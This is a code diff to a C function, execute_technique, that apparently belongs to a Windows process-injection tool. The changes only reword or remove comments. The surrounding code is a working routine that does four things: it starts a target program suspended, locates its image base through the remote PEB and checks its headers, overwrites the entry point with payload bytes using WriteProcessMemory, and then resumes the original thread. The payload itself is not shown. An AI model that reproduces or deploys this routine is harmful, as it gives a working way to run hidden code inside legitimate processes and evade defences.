@@ -63,7 +63,6 @@ int execute_technique(
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
 
-    // 1. Create suspended target process
     if (!CreateProcessA(
         target, NULL, NULL, NULL, FALSE,
         CREATE_SUSPENDED, NULL, NULL, &si, &pi
@@ -72,7 +71,7 @@ int execute_technique(
         return -2;
     }
 
-    // 2. Obtain the target process main ImageBase from remote PEB
+    /* Resolve the target image base from the remote PEB. */
     PVOID pTargetImageBase = get_main_image_base(pi.hProcess);
     if (!pTargetImageBase) {
         fprintf(stderr, "[-] Failed to obtain ImageBase from remote PEB\n");
@@ -82,7 +81,6 @@ int execute_technique(
         return -3;
     }
 
-    // 3. Read the TARGET's remote DOS header
     IMAGE_DOS_HEADER dosHeader;
     if (!ReadProcessMemory(pi.hProcess, pTargetImageBase, &dosHeader, sizeof(dosHeader), NULL)) {
         fprintf(stderr, "[-] Failed to read remote DOS header: %d\n", GetLastError());
@@ -92,7 +90,6 @@ int execute_technique(
         return -4;
     }
 
-    // Validate DOS header
     if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
         fprintf(stderr, "[-] Invalid DOS signature at target ImageBase\n");
         TerminateProcess(pi.hProcess, 0);
@@ -101,7 +98,6 @@ int execute_technique(
         return -5;
     }
 
-    // 4. Read the TARGET's remote NT headers
     DWORD ntHeadersOffset = dosHeader.e_lfanew;
     IMAGE_NT_HEADERS ntHeaders;
     if (!ReadProcessMemory(
@@ -118,7 +114,6 @@ int execute_technique(
         return -6;
     }
 
-    // Validate NT signature
     if (ntHeaders.Signature != IMAGE_NT_SIGNATURE) {
         fprintf(stderr, "[-] Invalid NT signature at target ImageBase\n");
         TerminateProcess(pi.hProcess, 0);
@@ -127,7 +122,7 @@ int execute_technique(
         return -7;
     }
 
-    // Validate target architecture against the build.
+    /* Validate target architecture against the current build. */
 #ifdef _WIN64
     if (ntHeaders.FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
         fprintf(stderr, "[-] Architecture mismatch: build=x64 target=non-x64\n");
@@ -146,7 +141,6 @@ int execute_technique(
     }
 #endif
 
-    // 5. Obtain AddressOfEntryPoint RVA
     DWORD entryPointRVA = ntHeaders.OptionalHeader.AddressOfEntryPoint;
     SIZE_T imageSize = (SIZE_T)ntHeaders.OptionalHeader.SizeOfImage;
 
@@ -164,10 +158,9 @@ int execute_technique(
         return -9;
     }
 
-    // 6. Calculate RemoteEntryPoint = ImageBase + AddressOfEntryPoint
+    /* Resolve the target entry point from its image base and RVA. */
     PVOID pRemoteEntryPoint = (PVOID)((DWORD_PTR)pTargetImageBase + entryPointRVA);
 
-    // 7. Overwrite the existing target EntryPoint with the opaque payload bytes
     SIZE_T bytesWritten = 0;
     if (!WriteProcessMemory(
         pi.hProcess,
@@ -211,7 +204,7 @@ int execute_technique(
         return -12;
     }
 
-    // 8. Resume the ORIGINAL suspended primary thread
+    /* Resume the original suspended primary thread. */
     if (ResumeThread(pi.hThread) == (DWORD)-1) {
         fprintf(stderr, "[-] ResumeThread failed: %lu\n", GetLastError());
         TerminateProcess(pi.hProcess, 0);
@@ -220,7 +213,6 @@ int execute_technique(
         return -13;
     }
 
-    // Cleanup
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
 
